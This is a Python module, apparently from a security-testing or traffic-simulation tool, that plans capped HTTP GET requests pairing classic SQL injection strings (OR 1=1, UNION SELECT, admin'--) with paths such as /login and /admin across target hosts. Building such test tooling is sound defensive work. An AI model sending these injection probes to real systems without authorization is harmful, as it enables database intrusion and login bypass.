"""SQL injection payload and URL planning — safe GET query strings only."""

from __future__ import annotations

from dataclasses import dataclass
from urllib.parse import quote

from dsp.protocols.base import HttpProtocolError
from dsp.protocols.http.urls import (
    PORT_PRIORITY,
    build_url,
    select_port_for_host,
)

SQLI_MAX_HOSTS_DEFAULT = 2
SQLI_MAX_REQUESTS_PER_HOST_DEFAULT = 10
SQLI_MAX_REQUESTS_TOTAL_DEFAULT = 20

SQLI_PATHS: tuple[str, ...] = (
    "/login",
    "/admin",
    "/api",
    "/search",
    "/index.html",
)

SQLI_PAYLOADS: tuple[str, ...] = (
    "id=1' OR '1'='1",
    "id=1 UNION SELECT 1",
    "user=admin'--",
    "q=' OR 1=1--",
    "id=1 AND 1=1",
)


@dataclass(frozen=True)
class PlannedSqliRequest:
    host: str
    port: int
    path: str
    query: str
    method: str = "GET"

    @property
    def payload(self) -> str:
        return f"?{self.query}"

    @property
    def url(self) -> str:
        return build_sqli_url(self.host, self.port, self.path, self.query)


def build_sqli_url(host: str, port: int, path: str, query: str) -> str:
    """Build HTTP/HTTPS URL with SQLi query string appended to path."""
    base = build_url(host, port, path)
    if not query:
        return base
    encoded = quote(query, safe="='&?")
    return f"{base}?{encoded}"


def plan_sqli_requests(
    hosts: list[str],
    *,
    max_hosts: int = SQLI_MAX_HOSTS_DEFAULT,
    max_per_host: int = SQLI_MAX_REQUESTS_PER_HOST_DEFAULT,
    max_total: int = SQLI_MAX_REQUESTS_TOTAL_DEFAULT,
    port_priority: tuple[int, ...] = PORT_PRIORITY,
    paths: tuple[str, ...] = SQLI_PATHS,
    payloads: tuple[str, ...] = SQLI_PAYLOADS,
) -> list[PlannedSqliRequest]:
    """
    Plan SQL injection HTTP GET requests across hosts, paths, and payloads.

    Caps: max 2 hosts, 10 requests per host, 20 requests total.
    """
    if max_hosts < 1 or max_per_host < 1 or max_total < 1:
        raise HttpProtocolError("request caps must be positive")
    if not paths:
        raise HttpProtocolError("at least one path is required")
    if not payloads:
        raise HttpProtocolError("at least one payload is required")

    selected = [h.strip() for h in hosts if h.strip()][:max_hosts]
    if not selected:
        raise HttpProtocolError("at least one host is required")

    plans: list[PlannedSqliRequest] = []
    path_index = 0
    payload_index = 0

    for host_index, host in enumerate(selected):
        port = select_port_for_host(host_index, port_priority)
        host_count = 0
        while host_count < max_per_host and len(plans) < max_total:
            path = paths[path_index % len(paths)]
            query = payloads[payload_index % len(payloads)]
            plans.append(
                PlannedSqliRequest(
                    host=host,
                    port=port,
                    path=path,
                    query=query,
                )
            )
            host_count += 1
            path_index += 1
            payload_index += 1

    return plans
